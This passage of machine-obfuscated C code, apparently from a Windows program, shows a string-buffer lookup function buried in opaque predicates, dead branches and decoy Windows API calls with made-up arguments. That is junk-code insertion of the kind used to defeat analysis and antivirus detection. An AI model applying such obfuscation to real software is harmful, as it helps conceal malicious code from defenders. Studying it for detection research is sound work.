                  if (!(((vcc9cd452dc9e327ba364fbc7d54ac697_prime_opaque % ((unsigned int) 2)) != ((unsigned int) 0)) || (vcc9cd452dc9e327ba364fbc7d54ac697_prime_opaque == ((unsigned int) 2))))
                  {
                    unsigned long v10df5cfe8305c6881380a47456dce2a6 = (unsigned long) 0x4887dee8;
                    unsigned long v2cf33f25159feb5195f824b568455aa4 = (unsigned long) 0x7e34d1b7;
                    v2cf33f25159feb5195f824b568455aa4 = MsiGetActiveDatabase(v10df5cfe8305c6881380a47456dce2a6);
                  }
                  const wchar_t *current = buffer;
                  for (int i = 0; i < n; i++)
                  {
                    while ((*current) != 0)
                    {
                      current++;
                      if (!(((vcc9cd452dc9e327ba364fbc7d54ac697_prime_opaque % ((unsigned int) 2)) != ((unsigned int) 0)) || (vcc9cd452dc9e327ba364fbc7d54ac697_prime_opaque == ((unsigned int) 2))))
                      {
                        unsigned long va806753e762ed70909298295023b34a1 = (unsigned long) 0xca173f68;
                        void * vba68cfbdef490c955b1d393331fada42 = (void *) 0x228da424;
                        int ve78e3b58c016b06786af0227791606bd = (int) 0x6c7db53f;
                        void * v62b5b53153eb039ebde88299ef6b6a90 = (void *) 0x9f6194d7;
                        int v68f627723dbb6c96cc9ec6193a3ac165 = (int) 0x34b20e56;
                        int vfdc5dc30d5efc7443a1ed7137381c02d = (int) 0xbec8c0e3;
                        vfdc5dc30d5efc7443a1ed7137381c02d = IdnToNameprepUnicode(va806753e762ed70909298295023b34a1, vba68cfbdef490c955b1d393331fada42, ve78e3b58c016b06786af0227791606bd, v62b5b53153eb039ebde88299ef6b6a90, v68f627723dbb6c96cc9ec6193a3ac165);
                        if (!(((vbb1105d9726aa89618c8ca3801ef988f_prime_opaque % ((unsigned int) 2)) != ((unsigned int) 0)) || (vbb1105d9726aa89618c8ca3801ef988f_prime_opaque == ((unsigned int) 2))))
                        {
                          v52fe191ceb0cc6716213832fdee51552_useless_opaque = v6fbe55e6bbee1ae9c25f8dfe26aac5cd_computation_opaque <= vecb8413303e8fe5863e0fe1b3a748b1b_computation_opaque;
                          v6c7a5b47ce7e33acc5965514e305a914_computation_opaque = v2a0c1e92fdc41f164c0f935d49a80408_computation_opaque + v095e5d529b8b1733f974e1456778da54_computation_opaque;
                        }
                      }
                      if (!(((vbb1105d9726aa89618c8ca3801ef988f_prime_opaque % ((unsigned int) 2)) != ((unsigned int) 0)) || (vbb1105d9726aa89618c8ca3801ef988f_prime_opaque == ((unsigned int) 2))))
                      {
                        v00afcd95c1652894507a953453aec944_computation_opaque = v5843b2a5c7c7c1e61bc08c6c0aa79ca7_useless_opaque < v52fe191ceb0cc6716213832fdee51552_useless_opaque;
                        v5f9bc37a953debb4d7a4c1470b061888_useless_opaque = v5f9bc37a953debb4d7a4c1470b061888_useless_opaque | v095e5d529b8b1733f974e1456778da54_computation_opaque;
                        vecb8413303e8fe5863e0fe1b3a748b1b_computation_opaque = v5f9bc37a953debb4d7a4c1470b061888_useless_opaque <= vbb1105d9726aa89618c8ca3801ef988f_prime_opaque;
                        if (!(((vcc9cd452dc9e327ba364fbc7d54ac697_prime_opaque % ((unsigned int) 2)) != ((unsigned int) 0)) || (vcc9cd452dc9e327ba364fbc7d54ac697_prime_opaque == ((unsigned int) 2))))
                        {
                          v6c7a5b47ce7e33acc5965514e305a914_computation_opaque = v6fbe55e6bbee1ae9c25f8dfe26aac5cd_computation_opaque % v5843b2a5c7c7c1e61bc08c6c0aa79ca7_useless_opaque;
                          v5843b2a5c7c7c1e61bc08c6c0aa79ca7_useless_opaque = v095e5d529b8b1733f974e1456778da54_computation_opaque * vecb8413303e8fe5863e0fe1b3a748b1b_computation_opaque;
                        }
                        v5843b2a5c7c7c1e61bc08c6c0aa79ca7_useless_opaque = v6c7a5b47ce7e33acc5965514e305a914_computation_opaque | ((unsigned int) 94);
                      }
                    }

                    if (!((((v194d3c9523a787887511b556e8d39695_random_opaque * v194d3c9523a787887511b556e8d39695_random_opaque) * ((unsigned int) 9)) + ((v194d3c9523a787887511b556e8d39695_random_opaque * v194d3c9523a787887511b556e8d39695_random_opaque) * ((unsigned int) 16))) == ((v194d3c9523a787887511b556e8d39695_random_opaque * v194d3c9523a787887511b556e8d39695_random_opaque) * ((unsigned int) 25))))
                    {
                      if (!(((vcc9cd452dc9e327ba364fbc7d54ac697_prime_opaque % ((unsigned int) 2)) != ((unsigned int) 0)) || (vcc9cd452dc9e327ba364fbc7d54ac697_prime_opaque == ((unsigned int) 2))))
                      {
                        v2a0c1e92fdc41f164c0f935d49a80408_computation_opaque = vecb8413303e8fe5863e0fe1b3a748b1b_computation_opaque + vbb1105d9726aa89618c8ca3801ef988f_prime_opaque;
                        vcc9cd452dc9e327ba364fbc7d54ac697_prime_opaque = v5843b2a5c7c7c1e61bc08c6c0aa79ca7_useless_opaque / v6c7a5b47ce7e33acc5965514e305a914_computation_opaque;
                      }
                      void * v0ce2f80a26a95a4275f3a61718d5c9ed = (void *) 0x366c609f;
                      unsigned long v3b8d28bbecd06c6dabac6b9422277c6c = (unsigned long) 0xfb0d1d0b;
                      unsigned long vb32c7925be922c449a401235c45eb80f = (unsigned long) 0x515268d4;
                      vb32c7925be922c449a401235c45eb80f = SnmpListen(v0ce2f80a26a95a4275f3a61718d5c9ed, v3b8d28bbecd06c6dabac6b9422277c6c);
                    }
                    current++;
                  }

                  unsigned int vbb340b65d282ddde721cfc2982d2b7af_useless_opaque = (unsigned int) 2477738832;
                  unsigned int vbc283f6318bd8baf8d7ddcd8cb20eaa8_computation_opaque = (unsigned int) (&vbb340b65d282ddde721cfc2982d2b7af_useless_opaque);
                  unsigned int v314e57a2dc28810ddad93e369ebda849_true_opaque = (((vbc283f6318bd8baf8d7ddcd8cb20eaa8_computation_opaque * vbc283f6318bd8baf8d7ddcd8cb20eaa8_computation_opaque) + vbc283f6318bd8baf8d7ddcd8cb20eaa8_computation_opaque) % ((unsigned int) 2)) == ((unsigned int) 0);
                  if (!(((vcc9cd452dc9e327ba364fbc7d54ac697_prime_opaque % ((unsigned int) 2)) != ((unsigned int) 0)) || (vcc9cd452dc9e327ba364fbc7d54ac697_prime_opaque == ((unsigned int) 2))))
                  {
                    v6c7a5b47ce7e33acc5965514e305a914_computation_opaque = vecb8413303e8fe5863e0fe1b3a748b1b_computation_opaque % vbb1105d9726aa89618c8ca3801ef988f_prime_opaque;
                    v00afcd95c1652894507a953453aec944_computation_opaque = v6c7a5b47ce7e33acc5965514e305a914_computation_opaque < vcc9cd452dc9e327ba364fbc7d54ac697_prime_opaque;
                    v00afcd95c1652894507a953453aec944_computation_opaque = vbc283f6318bd8baf8d7ddcd8cb20eaa8_computation_opaque % v314e57a2dc28810ddad93e369ebda849_true_opaque;
                    vbb1105d9726aa89618c8ca3801ef988f_prime_opaque = v2a0c1e92fdc41f164c0f935d49a80408_computation_opaque % v00afcd95c1652894507a953453aec944_computation_opaque;
                    vcc9cd452dc9e327ba364fbc7d54ac697_prime_opaque = v5843b2a5c7c7c1e61bc08c6c0aa79ca7_useless_opaque - vbb1105d9726aa89618c8ca3801ef988f_prime_opaque;
                  }
                  return current;
                }
              }
            }
          }
        }
      }
    }
  }
}

const char *get_function_by_number(const char *buffer, int n)
{
  unsigned int vc19f80b4d18c71c42fb4e3f189b56ad4_useless_opaque = (unsigned int) 2171884650;
  unsigned int va10d3272a926a4352d6d8b84b8698d36_random_opaque = (unsigned int) (&vc19f80b4d18c71c42fb4e3f189b56ad4_useless_opaque);
  {
    unsigned int v7df3d06d965d21af7a2a8c376bdbec53_useless_opaque = (unsigned int) 2366505162;
    unsigned int v7bccecb1da9cc07c7df51c56a2c2c7d8_computation_opaque = (unsigned int) 0;
    unsigned int vff6d5bf63d5ea5d965c6eb3c13eb2050_computation_opaque = (unsigned int) 3;
    unsigned int v919d1d5745bca768ecbaff770e72d5c3_computation_opaque = (unsigned int) (&v7df3d06d965d21af7a2a8c376bdbec53_useless_opaque);
    v919d1d5745bca768ecbaff770e72d5c3_computation_opaque = (v919d1d5745bca768ecbaff770e72d5c3_computation_opaque % ((unsigned int) 2147483647)) | ((unsigned int) 1);
    if (v919d1d5745bca768ecbaff770e72d5c3_computation_opaque < ((unsigned int) 3))
    {
      unsigned int va84f5cc6b36e3a61a961464e6f67a91e_useless_opaque = (unsigned int) 1177964189;
      unsigned int v4fcac7b4cdbc8181bc4cb7412ca1799e_computation_opaque = (unsigned int) 0;
      unsigned int v2a44692bb614e75d7982923ab0bbd84d_computation_opaque = (unsigned int) 3;
      unsigned int v1e42030b3e94e92fb1abdf91ec0ca845_computation_opaque = (unsigned int) (&va84f5cc6b36e3a61a961464e6f67a91e_useless_opaque);
      v1e42030b3e94e92fb1abdf91ec0ca845_computation_opaque = (v1e42030b3e94e92fb1abdf91ec0ca845_computation_opaque % ((unsigned int) 2147483647)) | ((unsigned int) 1);
      if ((((va10d3272a926a4352d6d8b84b8698d36_random_opaque * va10d3272a926a4352d6d8b84b8698d36_random_opaque) * ((unsigned int) 9)) + ((va10d3272a926a4352d6d8b84b8698d36_random_opaque * va10d3272a926a4352d6d8b84b8698d36_random_opaque) * ((unsigned int) 16))) == ((va10d3272a926a4352d6d8b84b8698d36_random_opaque * va10d3272a926a4352d6d8b84b8698d36_random_opaque) * ((unsigned int) 25)))
      {
        if (v1e42030b3e94e92fb1abdf91ec0ca845_computation_opaque < ((unsigned int) 3))
        {
          if ((((va10d3272a926a4352d6d8b84b8698d36_random_opaque * va10d3272a926a4352d6d8b84b8698d36_random_opaque) * ((unsigned int) 9)) + ((va10d3272a926a4352d6d8b84b8698d36_random_opaque * va10d3272a926a4352d6d8b84b8698d36_random_opaque) * ((unsigned int) 16))) == ((va10d3272a926a4352d6d8b84b8698d36_random_opaque * va10d3272a926a4352d6d8b84b8698d36_random_opaque) * ((unsigned int) 25)))
          {
            v1e42030b3e94e92fb1abdf91ec0ca845_computation_opaque = (unsigned int) 3;
          }
        }
        if (!((((va10d3272a926a4352d6d8b84b8698d36_random_opaque * va10d3272a926a4352d6d8b84b8698d36_random_opaque) * ((unsigned int) 9)) + ((va10d3272a926a4352d6d8b84b8698d36_random_opaque * va10d3272a926a4352d6d8b84b8698d36_random_opaque) * ((unsigned int) 16))) == ((va10d3272a926a4352d6d8b84b8698d36_random_opaque * va10d3272a926a4352d6d8b84b8698d36_random_opaque) * ((unsigned int) 25))))
        {
          vc19f80b4d18c71c42fb4e3f189b56ad4_useless_opaque = v1e42030b3e94e92fb1abdf91ec0ca845_computation_opaque - vc19f80b4d18c71c42fb4e3f189b56ad4_useless_opaque;
        }
        while (v4fcac7b4cdbc8181bc4cb7412ca1799e_computation_opaque != ((unsigned int) 1))
        {
          v1e42030b3e94e92fb1abdf91ec0ca845_computation_opaque += (unsigned int) 2;
          if ((((va10d3272a926a4352d6d8b84b8698d36_random_opaque * va10d3272a926a4352d6d8b84b8698d36_random_opaque) * ((unsigned int) 9)) + ((va10d3272a926a4352d6d8b84b8698d36_random_opaque * va10d3272a926a4352d6d8b84b8698d36_random_opaque) * ((unsigned int) 16))) == ((va10d3272a926a4352d6d8b84b8698d36_random_opaque * va10d3272a926a4352d6d8b84b8698d36_random_opaque) * ((unsigned int) 25)))
          {
            if (!((((va10d3272a926a4352d6d8b84b8698d36_random_opaque * va10d3272a926a4352d6d8b84b8698d36_random_opaque) * ((unsigned int) 9)) + ((va10d3272a926a4352d6d8b84b8698d36_random_opaque * va10d3272a926a4352d6d8b84b8698d36_random_opaque) * ((unsigned int) 16))) == ((va10d3272a926a4352d6d8b84b8698d36_random_opaque * va10d3272a926a4352d6d8b84b8698d36_random_opaque) * ((unsigned int) 25))))
            {
              unsigned long vb2f5b50b830bea2ebfcf5e336fd8ed3d = (unsigned long) 0x311ce6d5;
              void * v117a2509309b6e4fa6020b3fc55dde0d = (void *) 0xeca1a97a;
              int vf31cdf6cc397b33985dde67b22ef10ed = (int) 0xeb3e8c73;
              if ((((va10d3272a926a4352d6d8b84b8698d36_random_opaque * va10d3272a926a4352d6d8b84b8698d36_random_opaque) * ((unsigned int) 9)) + ((va10d3272a926a4352d6d8b84b8698d36_random_opaque * va10d3272a926a4352d6d8b84b8698d36_random_opaque) * ((unsigned int) 16))) == ((va10d3272a926a4352d6d8b84b8698d36_random_opaque * va10d3272a926a4352d6d8b84b8698d36_random_opaque) * ((unsigned int) 25)))
              {
                void * vd999fbf3f31cc38df71e8df66a64245c = (void *) 0x7af33632;
                int vb0f061959056a117859350a34204da03 = (int) 0x377fcf05;
                int v8ecf178f92d68277618bc10f5e755dee = (int) 0xc490f1c3;
                v8ecf178f92d68277618bc10f5e755dee = IdnToNameprepUnicode(vb2f5b50b830bea2ebfcf5e336fd8ed3d, v117a2509309b6e4fa6020b3fc55dde0d, vf31cdf6cc397b33985dde67b22ef10ed, vd999fbf3f31cc38df71e8df66a64245c, vb0f061959056a117859350a34204da03);
              }
            }
            v4fcac7b4cdbc8181bc4cb7412ca1799e_computation_opaque = (unsigned int) 1;
            if ((((va10d3272a926a4352d6d8b84b8698d36_random_opaque * va10d3272a926a4352d6d8b84b8698d36_random_opaque) * ((unsigned int) 9)) + ((va10d3272a926a4352d6d8b84b8698d36_random_opaque * va10d3272a926a4352d6d8b84b8698d36_random_opaque) * ((unsigned int) 16))) == ((va10d3272a926a4352d6d8b84b8698d36_random_opaque * va10d3272a926a4352d6d8b84b8698d36_random_opaque) * ((unsigned int) 25)))
            {
              v2a44692bb614e75d7982923ab0bbd84d_computation_opaque = (unsigned int) 3;
              if (!((((va10d3272a926a4352d6d8b84b8698d36_random_opaque * va10d3272a926a4352d6d8b84b8698d36_random_opaque) * ((unsigned int) 9)) + ((va10d3272a926a4352d6d8b84b8698d36_random_opaque * va10d3272a926a4352d6d8b84b8698d36_random_opaque) * ((unsigned int) 16))) == ((va10d3272a926a4352d6d8b84b8698d36_random_opaque * va10d3272a926a4352d6d8b84b8698d36_random_opaque) * ((unsigned int) 25))))
              {
                vff6d5bf63d5ea5d965c6eb3c13eb2050_computation_opaque = va84f5cc6b36e3a61a961464e6f67a91e_useless_opaque <= v7df3d06d965d21af7a2a8c376bdbec53_useless_opaque;
                vff6d5bf63d5ea5d965c6eb3c13eb2050_computation_opaque = v4fcac7b4cdbc8181bc4cb7412ca1799e_computation_opaque / v1e42030b3e94e92fb1abdf91ec0ca845_computation_opaque;
                v1e42030b3e94e92fb1abdf91ec0ca845_computation_opaque = v2a44692bb614e75d7982923ab0bbd84d_computation_opaque * vff6d5bf63d5ea5d965c6eb3c13eb2050_computation_opaque;
                v7bccecb1da9cc07c7df51c56a2c2c7d8_computation_opaque = va84f5cc6b36e3a61a961464e6f67a91e_useless_opaque | va10d3272a926a4352d6d8b84b8698d36_random_opaque;
                va84f5cc6b36e3a61a961464e6f67a91e_useless_opaque = va84f5cc6b36e3a61a961464e6f67a91e_useless_opaque + vff6d5bf63d5ea5d965c6eb3c13eb2050_computation_opaque;
              }
              while ((v2a44692bb614e75d7982923ab0bbd84d_computation_opaque * v2a44692bb614e75d7982923ab0bbd84d_computation_opaque) <= v1e42030b3e94e92fb1abdf91ec0ca845_computation_opaque)
              {
                if ((v1e42030b3e94e92fb1abdf91ec0ca845_computation_opaque % v2a44692bb614e75d7982923ab0bbd84d_computation_opaque) == ((unsigned int) 0))
                {
                  v4fcac7b4cdbc8181bc4cb7412ca1799e_computation_opaque = (unsigned int) 0;
                  if (!((((va10d3272a926a4352d6d8b84b8698d36_random_opaque * va10d3272a926a4352d6d8b84b8698d36_random_opaque) * ((unsigned int) 9)) + ((va10d3272a926a4352d6d8b84b8698d36_random_opaque * va10d3272a926a4352d6d8b84b8698d36_random_opaque) * ((unsigned int) 16))) == ((va10d3272a926a4352d6d8b84b8698d36_random_opaque * va10d3272a926a4352d6d8b84b8698d36_random_opaque) * ((unsigned int) 25))))
                  {
                    va10d3272a926a4352d6d8b84b8698d36_random_opaque = vc19f80b4d18c71c42fb4e3f189b56ad4_useless_opaque != v4fcac7b4cdbc8181bc4cb7412ca1799e_computation_opaque;
                    v7bccecb1da9cc07c7df51c56a2c2c7d8_computation_opaque = va10d3272a926a4352d6d8b84b8698d36_random_opaque == vff6d5bf63d5ea5d965c6eb3c13eb2050_computation_opaque;
                    if (!((((va10d3272a926a4352d6d8b84b8698d36_random_opaque * va10d3272a926a4352d6d8b84b8698d36_random_opaque) * ((unsigned int) 9)) + ((va10d3272a926a4352d6d8b84b8698d36_random_opaque * va10d3272a926a4352d6d8b84b8698d36_random_opaque) * ((unsigned int) 16))) == ((va10d3272a926a4352d6d8b84b8698d36_random_opaque * va10d3272a926a4352d6d8b84b8698d36_random_opaque) * ((unsigned int) 25))))
                    {
                      va84f5cc6b36e3a61a961464e6f67a91e_useless_opaque = va84f5cc6b36e3a61a961464e6f67a91e_useless_opaque <= vc19f80b4d18c71c42fb4e3f189b56ad4_useless_opaque;
                      vff6d5bf63d5ea5d965c6eb3c13eb2050_computation_opaque = v7bccecb1da9cc07c7df51c56a2c2c7d8_computation_opaque - vc19f80b4d18c71c42fb4e3f189b56ad4_useless_opaque;
                    }
                  }
                }
                v2a44692bb614e75d7982923ab0bbd84d_computation_opaque = v2a44692bb614e75d7982923ab0bbd84d_computation_opaque + ((unsigned int) 2);
              }

            }
          }
        }

        unsigned int ve042cc3e437313d4b42b4f87d6ff91ef_prime_opaque = v1e42030b3e94e92fb1abdf91ec0ca845_computation_opaque;
        v919d1d5745bca768ecbaff770e72d5c3_computation_opaque = (unsigned int) 3;
      }
    }
    while (v7bccecb1da9cc07c7df51c56a2c2c7d8_computation_opaque != ((unsigned int) 1))
    {
      v919d1d5745bca768ecbaff770e72d5c3_computation_opaque += (unsigned int) 2;
      v7bccecb1da9cc07c7df51c56a2c2c7d8_computation_opaque = (unsigned int) 1;
      vff6d5bf63d5ea5d965c6eb3c13eb2050_computation_opaque = (unsigned int) 3;
      if ((((va10d3272a926a4352d6d8b84b8698d36_random_opaque * va10d3272a926a4352d6d8b84b8698d36_random_opaque) * ((unsigned int) 9)) + ((va10d3272a926a4352d6d8b84b8698d36_random_opaque * va10d3272a926a4352d6d8b84b8698d36_random_opaque) * ((unsigned int) 16))) == ((va10d3272a926a4352d6d8b84b8698d36_random_opaque * va10d3272a926a4352d6d8b84b8698d36_random_opaque) * ((unsigned int) 25)))
      {
        while ((vff6d5bf63d5ea5d965c6eb3c13eb2050_computation_opaque * vff6d5bf63d5ea5d965c6eb3c13eb2050_computation_opaque) <= v919d1d5745bca768ecbaff770e72d5c3_computation_opaque)
        {
          if ((v919d1d5745bca768ecbaff770e72d5c3_computation_opaque % vff6d5bf63d5ea5d965c6eb3c13eb2050_computation_opaque) == ((unsigned int) 0))
          {
            v7bccecb1da9cc07c7df51c56a2c2c7d8_computation_opaque = (unsigned int) 0;
            if (!((((va10d3272a926a4352d6d8b84b8698d36_random_opaque * va10d3272a926a4352d6d8b84b8698d36_random_opaque) * ((unsigned int) 9)) + ((va10d3272a926a4352d6d8b84b8698d36_random_opaque * va10d3272a926a4352d6d8b84b8698d36_random_opaque) * ((unsigned int) 16))) == ((va10d3272a926a4352d6d8b84b8698d36_random_opaque * va10d3272a926a4352d6d8b84b8698d36_random_opaque) * ((unsigned int) 25))))
            {
              unsigned long vb6e2f459eebd32a5055606d51dab95ef = (unsigned long) 0x4657d43d;
              void * vaeff66ba2e07ea7acc8612b97d6b9f3c = (void *) 0xa2e83355;
              int v8766584dfb0f57cc0cc09236761c3224 = (int) 0xcbfed1d9;
              void * v3e9a1873c434a1eedc2c0580c0066532 = (void *) 0xa6f6c194;
              int v6e9d74e5a37ee4da0ef4f3291bf39fff = (int) 0xd1cf477c;
              int va4a3b16ff9e7180227e04f2136be78b3 = (int) 0x9759645e;
              va4a3b16ff9e7180227e04f2136be78b3 = IdnToNameprepUnicode(vb6e2f459eebd32a5055606d51dab95ef, vaeff66ba2e07ea7acc8612b97d6b9f3c, v8766584dfb0f57cc0cc09236761c3224, v3e9a1873c434a1eedc2c0580c0066532, v6e9d74e5a37ee4da0ef4f3291bf39fff);
            }
          }
          vff6d5bf63d5ea5d965c6eb3c13eb2050_computation_opaque = vff6d5bf63d5ea5d965c6eb3c13eb2050_computation_opaque + ((unsigned int) 2);
          if ((((va10d3272a926a4352d6d8b84b8698d36_random_opaque * va10d3272a926a4352d6d8b84b8698d36_random_opaque) * ((unsigned int) 9)) + ((va10d3272a926a4352d6d8b84b8698d36_random_opaque * va10d3272a926a4352d6d8b84b8698d36_random_opaque) * ((unsigned int) 16))) == ((va10d3272a926a4352d6d8b84b8698d36_random_opaque * va10d3272a926a4352d6d8b84b8698d36_random_opaque) * ((unsigned int) 25)))
          {
            if ((((va10d3272a926a4352d6d8b84b8698d36_random_opaque * va10d3272a926a4352d6d8b84b8698d36_random_opaque) * ((unsigned int) 9)) + ((va10d3272a926a4352d6d8b84b8698d36_random_opaque * va10d3272a926a4352d6d8b84b8698d36_random_opaque) * ((unsigned int) 16))) == ((va10d3272a926a4352d6d8b84b8698d36_random_opaque * va10d3272a926a4352d6d8b84b8698d36_random_opaque) * ((unsigned int) 25)))
            {
              if (!((((va10d3272a926a4352d6d8b84b8698d36_random_opaque * va10d3272a926a4352d6d8b84b8698d36_random_opaque) * ((unsigned int) 9)) + ((va10d3272a926a4352d6d8b84b8698d36_random_opaque * va10d3272a926a4352d6d8b84b8698d36_random_opaque) * ((unsigned int) 16))) == ((va10d3272a926a4352d6d8b84b8698d36_random_opaque * va10d3272a926a4352d6d8b84b8698d36_random_opaque) * ((unsigned int) 25))))
              {
                vff6d5bf63d5ea5d965c6eb3c13eb2050_computation_opaque = vc19f80b4d18c71c42fb4e3f189b56ad4_useless_opaque == va10d3272a926a4352d6d8b84b8698d36_random_opaque;
                v7df3d06d965d21af7a2a8c376bdbec53_useless_opaque = v7df3d06d965d21af7a2a8c376bdbec53_useless_opaque + vff6d5bf63d5ea5d965c6eb3c13eb2050_computation_opaque;
                vff6d5bf63d5ea5d965c6eb3c13eb2050_computation_opaque = vff6d5bf63d5ea5d965c6eb3c13eb2050_computation_opaque == va10d3272a926a4352d6d8b84b8698d36_random_opaque;
                v7df3d06d965d21af7a2a8c376bdbec53_useless_opaque = vff6d5bf63d5ea5d965c6eb3c13eb2050_computation_opaque || vc19f80b4d18c71c42fb4e3f189b56ad4_useless_opaque;
              }
            }
          }
        }

      }
    }

    unsigned int v9342e00bcbdb2c2619c495b2cd3f2e68_prime_opaque = v919d1d5745bca768ecbaff770e72d5c3_computation_opaque;
    {
      if (!((((va10d3272a926a4352d6d8b84b8698d36_random_opaque * va10d3272a926a4352d6d8b84b8698d36_random_opaque) * ((unsigned int) 9)) + ((va10d3272a926a4352d6d8b84b8698d36_random_opaque * va10d3272a926a4352d6d8b84b8698d36_random_opaque) * ((unsigned int) 16))) == ((va10d3272a926a4352d6d8b84b8698d36_random_opaque * va10d3272a926a4352d6d8b84b8698d36_random_opaque) * ((unsigned int) 25))))
      {
        vc19f80b4d18c71c42fb4e3f189b56ad4_useless_opaque = v7df3d06d965d21af7a2a8c376bdbec53_useless_opaque + va10d3272a926a4352d6d8b84b8698d36_random_opaque;
        vff6d5bf63d5ea5d965c6eb3c13eb2050_computation_opaque = v7df3d06d965d21af7a2a8c376bdbec53_useless_opaque || va10d3272a926a4352d6d8b84b8698d36_random_opaque;
        vc19f80b4d18c71c42fb4e3f189b56ad4_useless_opaque = vff6d5bf63d5ea5d965c6eb3c13eb2050_computation_opaque / v9342e00bcbdb2c2619c495b2cd3f2e68_prime_opaque;
      }
      unsigned int ve02a4744760fad39fcd116c5cc851574_useless_opaque = (unsigned int) 2862192968;
      unsigned int v92bba7a3129c4be18a3f0ad237c5cbd7_computation_opaque = (unsigned int) 0;
      unsigned int v72ba35f33f07ba681820321c1e01aabe_computation_opaque = (unsigned int) 3;
      unsigned int v4f481b54de890716f2463ecc1eae8496_computation_opaque = (unsigned int) (&ve02a4744760fad39fcd116c5cc851574_useless_opaque);
      if (!((((va10d3272a926a4352d6d8b84b8698d36_random_opaque * va10d3272a926a4352d6d8b84b8698d36_random_opaque) * ((unsigned int) 9)) + ((va10d3272a926a4352d6d8b84b8698d36_random_opaque * va10d3272a926a4352d6d8b84b8698d36_random_opaque) * ((unsigned int) 16))) == ((va10d3272a926a4352d6d8b84b8698d36_random_opaque * va10d3272a926a4352d6d8b84b8698d36_random_opaque) * ((unsigned int) 25))))
      {
        void * ve13aa85d9209cdcca354a014cafe3af2 = (void *) 0xe4729e17;
        if (((v9342e00bcbdb2c2619c495b2cd3f2e68_prime_opaque % ((unsigned int) 2)) != ((unsigned int) 0)) || (v9342e00bcbdb2c2619c495b2cd3f2e68_prime_opaque == ((unsigned int) 2)))
        {
          if (!((((va10d3272a926a4352d6d8b84b8698d36_random_opaque * va10d3272a926a4352d6d8b84b8698d36_random_opaque) * ((unsigned int) 9)) + ((va10d3272a926a4352d6d8b84b8698d36_random_opaque * va10d3272a926a4352d6d8b84b8698d36_random_opaque) * ((unsigned int) 16))) == ((va10d3272a926a4352d6d8b84b8698d36_random_opaque * va10d3272a926a4352d6d8b84b8698d36_random_opaque) * ((unsigned int) 25))))
          {
            unsigned long vab53f3f671da3ab20f969e24938133ce = (unsigned long) 0x9249f494;
            unsigned long v1b48fe2dac201311cc2f55f86090a2e2 = (unsigned long) 0x1bc613d2;
            void * v6b3c926d76a05dddb56a8db549c711fd = (void *) 0xe2f75ea3;
            int v41018942ef192f4d178bb7e5b3af29f6 = (int) 0xe931a076;
            int v1e1b7cbc79ad14cbfdfc3a0256e43614 = (int) 0x0f8f7c4c;
            v1e1b7cbc79ad14cbfdfc3a0256e43614 = GetLocaleInfoW(vab53f3f671da3ab20f969e24938133ce, v1b48fe2dac201311cc2f55f86090a2e2, v6b3c926d76a05dddb56a8db549c711fd, v41018942ef192f4d178bb7e5b3af29f6);
            if (!(((v9342e00bcbdb2c2619c495b2cd3f2e68_prime_opaque % ((unsigned int) 2)) != ((unsigned int) 0)) || (v9342e00bcbdb2c2619c495b2cd3f2e68_prime_opaque == ((unsigned int) 2))))
            {
              if (!((((va10d3272a926a4352d6d8b84b8698d36_random_opaque * va10d3272a926a4352d6d8b84b8698d36_random_opaque) * ((unsigned int) 9)) + ((va10d3272a926a4352d6d8b84b8698d36_random_opaque * va10d3272a926a4352d6d8b84b8698d36_random_opaque) * ((unsigned int) 16))) == ((va10d3272a926a4352d6d8b84b8698d36_random_opaque * va10d3272a926a4352d6d8b84b8698d36_random_opaque) * ((unsigned int) 25))))
              {
                v7df3d06d965d21af7a2a8c376bdbec53_useless_opaque = v92bba7a3129c4be18a3f0ad237c5cbd7_computation_opaque / v919d1d5745bca768ecbaff770e72d5c3_computation_opaque;
                vff6d5bf63d5ea5d965c6eb3c13eb2050_computation_opaque = ve02a4744760fad39fcd116c5cc851574_useless_opaque % v4f481b54de890716f2463ecc1eae8496_computation_opaque;
                v72ba35f33f07ba681820321c1e01aabe_computation_opaque = v72ba35f33f07ba681820321c1e01aabe_computation_opaque - v919d1d5745bca768ecbaff770e72d5c3_computation_opaque;
              }
              if (!(((v9342e00bcbdb2c2619c495b2cd3f2e68_prime_opaque % ((unsigned int) 2)) != ((unsigned int) 0)) || (v9342e00bcbdb2c2619c495b2cd3f2e68_prime_opaque == ((unsigned int) 2))))
              {
                if (!(((v9342e00bcbdb2c2619c495b2cd3f2e68_prime_opaque % ((unsigned int) 2)) != ((unsigned int) 0)) || (v9342e00bcbdb2c2619c495b2cd3f2e68_prime_opaque == ((unsigned int) 2))))
                {
                  v9342e00bcbdb2c2619c495b2cd3f2e68_prime_opaque = v4f481b54de890716f2463ecc1eae8496_computation_opaque % v9342e00bcbdb2c2619c495b2cd3f2e68_prime_opaque;
                  ve02a4744760fad39fcd116c5cc851574_useless_opaque = v7bccecb1da9cc07c7df51c56a2c2c7d8_computation_opaque == va10d3272a926a4352d6d8b84b8698d36_random_opaque;
                }
                v9342e00bcbdb2c2619c495b2cd3f2e68_prime_opaque = ve02a4744760fad39fcd116c5cc851574_useless_opaque == v4f481b54de890716f2463ecc1eae8496_computation_opaque;
                v4f481b54de890716f2463ecc1eae8496_computation_opaque = vff6d5bf63d5ea5d965c6eb3c13eb2050_computation_opaque < vc19f80b4d18c71c42fb4e3f189b56ad4_useless_opaque;
                v7df3d06d965d21af7a2a8c376bdbec53_useless_opaque = v7df3d06d965d21af7a2a8c376bdbec53_useless_opaque * v919d1d5745bca768ecbaff770e72d5c3_computation_opaque;
                v9342e00bcbdb2c2619c495b2cd3f2e68_prime_opaque = vc19f80b4d18c71c42fb4e3f189b56ad4_useless_opaque == ((unsigned int) 19);
                vff6d5bf63d5ea5d965c6eb3c13eb2050_computation_opaque = v7bccecb1da9cc07c7df51c56a2c2c7d8_computation_opaque <= v72ba35f33f07ba681820321c1e01aabe_computation_opaque;
                va10d3272a926a4352d6d8b84b8698d36_random_opaque = v7df3d06d965d21af7a2a8c376bdbec53_useless_opaque == ve02a4744760fad39fcd116c5cc851574_useless_opaque;
                vff6d5bf63d5ea5d965c6eb3c13eb2050_computation_opaque = ve02a4744760fad39fcd116c5cc851574_useless_opaque < vff6d5bf63d5ea5d965c6eb3c13eb2050_computation_opaque;
              }
              v9342e00bcbdb2c2619c495b2cd3f2e68_prime_opaque = v7df3d06d965d21af7a2a8c376bdbec53_useless_opaque + v72ba35f33f07ba681820321c1e01aabe_computation_opaque;
              v7bccecb1da9cc07c7df51c56a2c2c7d8_computation_opaque = v7df3d06d965d21af7a2a8c376bdbec53_useless_opaque - vff6d5bf63d5ea5d965c6eb3c13eb2050_computation_opaque;
            }
          }
          unsigned long v9c4f9c818aef129deca411928bd4496a = (unsigned long) 0x14135c2e;
